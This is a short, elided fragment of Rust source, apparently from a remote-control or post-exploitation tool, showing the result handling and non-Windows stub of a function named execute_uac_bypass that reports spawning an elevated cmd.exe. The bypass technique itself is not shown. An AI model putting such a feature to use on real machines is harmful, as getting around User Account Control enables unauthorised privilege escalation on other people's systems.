...
///               If empty, spawns an elevated cmd.exe
///
/// # Returns
        ...
        Ok(()) => {
            if command.is_empty() {
                CommandResult::TextResponse(
                    "**UAC Bypass:** Success!\n\n\
                    Spawned elevated cmd.exe window.".to_string()
                )
            } else {
                CommandResult::TextResponse(
                    format!(
...
pub fn execute_uac_bypass(_command: &str) -> CommandResult {
    CommandResult::Error(
        "UAC Bypass is only available on Windows systems.".to_string()
    )
}
